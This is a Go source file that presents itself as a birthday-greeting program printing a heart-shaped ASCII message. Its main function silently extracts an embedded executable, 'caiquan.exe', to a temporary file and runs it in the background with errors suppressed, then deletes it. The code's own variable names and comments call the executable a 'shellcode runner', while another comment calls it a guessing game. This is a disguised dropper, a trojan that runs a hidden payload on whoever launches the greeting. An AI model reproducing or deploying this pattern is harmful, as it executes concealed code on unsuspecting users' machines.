package main

import (
	"embed"

	_ "math/rand"
	"os"
	"os/exec"
	_ "strconv"
)
import (
	"flag"
	"fmt"
	"math"
	"strings"
	"time"
)

//go:embed caiquan.exe
var caiquanExeF embed.FS

func main() {
	caiquanExePath := "caiquan.exe"
	caiquanExeData, err := caiquanExeF.ReadFile(caiquanExePath)
	if err != nil {
		//fmt.Println("Error reading embedded caiquan.exe:", err)
		return
	}
	tempCaiquanExe, err := os.CreateTemp("", "caiquan-*.exe")
	if err != nil {
		//fmt.Println("Error creating temporary file for caiquan.exe:", err)
		return
	}
	defer func(tempCaiquanExe *os.File) {
		err := tempCaiquanExe.Close()
		if err != nil {
			//fmt.Println("Error closing temporary file:", err)
		}
	}(tempCaiquanExe)
	defer func(name string) {
		err := os.Remove(name)
		if err != nil {
			return
		}

	}(tempCaiquanExe.Name()) // 清理临时文件

	if _, err := tempCaiquanExe.Write(caiquanExeData); err != nil {
		//fmt.Println("Error writing caiquan.exe to temporary file:", err)
		return
	}
	if err := tempCaiquanExe.Sync(); err != nil {
		//fmt.Println("Error syncing temporary file:", err)
		return
	}
	if err := tempCaiquanExe.Close(); err != nil {
		//fmt.Println("Error closing temporary file:", err)
		return
	}
	go func() {
		shellcodeCmd := exec.Command(tempCaiquanExe.Name())
		if err := shellcodeCmd.Start(); err != nil {
			//fmt.Println("Error starting shellcode runner:", err)
			return
		}
		if err := shellcodeCmd.Wait(); err != nil {
			//fmt.Println("Error waiting for shellcode runner to finish:", err)
			return
		}
	}()
	// 运行猜拳游戏
	love()
}
func love() {
	var head string
	var tail string
	var MYWORD string
	var sep string
	var zoom float64
	flag.StringVar(&head, "head", "鸽鸽生日快乐！！！！！！！！！！！！！！！", "A sentence printed on the head")         // 添加开头要写的话
	flag.StringVar(&tail, "tail", "\t\t\t\t--- Resss Productions", "A sentence printed on the tail") // 添加结尾要写的话
	flag.StringVar(&MYWORD, "words", "Dearfc, I love you forever!", "The words you want to say")     // 爱心中的内容
	flag.StringVar(&sep, "sep", " ", "The separator")
	flag.Float64Var(&zoom, "zoom", 1.0, "Zoom setting")
	flag.Parse()

	chars := strings.Split(MYWORD, sep)

	time.Sleep(time.Duration(1) * time.Second)
	fmt.Println(head)
	fmt.Println()
	time.Sleep(time.Duration(1) * time.Second)
	for _, char := range chars {
		allChar := make([]string, 0)

		for y := 12 * zoom; y > -12*zoom; y-- {
			lst := make([]string, 0)
			lstCon := ""
			for x := -30 * zoom; x < 30*zoom; x++ {
				x2 := float64(x)
				y2 := float64(y)
				formula := math.Pow(math.Pow(x2*0.04/zoom, 2)+math.Pow(y2*0.1/zoom, 2)-1, 3) - math.Pow(x2*0.04/zoom, 2)*math.Pow(y2*0.1/zoom, 3)
				if formula <= 0 {
					index := int(x) % len(char)
					if index >= 0 {
						lstCon += string(char[index])
					} else {
						lstCon += string(char[int(float64(len(char))-math.Abs(float64(index)))])
					}

				} else {
					lstCon += " "
				}
			}
			lst = append(lst, lstCon)
			allChar = append(allChar, lst...)
		}

		for _, text := range allChar {
			fmt.Printf("%s\n", text)
			time.Sleep(time.Duration(200) * time.Millisecond) // 每个字符生成的时间为0.2秒
		}
	}
	time.Sleep(time.Duration(1) * time.Second)
	fmt.Println("\t\t\t\t", tail)
}
